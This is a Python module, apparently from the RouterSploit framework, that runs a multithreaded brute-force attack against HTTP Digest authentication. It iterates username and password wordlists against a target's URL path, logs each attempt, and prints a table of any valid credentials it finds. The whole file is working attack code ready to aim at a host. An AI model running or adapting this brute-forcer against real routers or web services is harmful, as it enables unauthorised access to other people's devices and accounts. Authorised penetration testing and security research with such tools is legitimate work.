import threading
import itertools

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    print_success,
    print_table,
    http_request,
    multi,
    threads,
    validators,
)

from routersploit.exceptions import StopThreadPoolExecutor
from requests.auth import HTTPDigestAuth


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against HTTP Digest Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Digest Bruteforce',
        'description': 'Module performs bruteforce attack against HTTP Digest Auth service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit HTTP Basic Auth module
            'Alexander Yakovlev <https://github.com/toxydose>',  # upgrading to perform bruteforce attack against HTTP Digest Auth service
        ],
        'references': [
            '',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(80, 'Target port')

    threads = exploits.Option(8, 'Numbers of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
    path = exploits.Option('/', 'URL Path')
    verbosity = exploits.Option(True, 'Display authentication attempts', validators=validators.boolify)
    stop_on_success = exploits.Option(True, 'Stop on first valid authentication attempt', validators=validators.boolify)

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        url = "{}:{}{}".format(self.target, self.port, self.path)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        if response.status_code != 401:
            print_status("Target is not protected by Digest Auth")
            return

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = itertools.product(usernames, passwords)

        with threads.ThreadPoolExecutor(self.threads) as executor:
            for record in collection:
                executor.submit(self.target_function, url, record)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, url, creds):
        name = threading.current_thread().name
        user, password = creds
        user = user.encode('utf-8').strip()
        password = password.encode('utf-8').strip()

        response = http_request(method="GET", url=url, auth=HTTPDigestAuth(user, password))

        if response is not None and response.status_code != 401:
            print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
            self.credentials.append((self.target, self.port, user, password))
            if self.stop_on_success:
                raise StopThreadPoolExecutor
        else:
            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
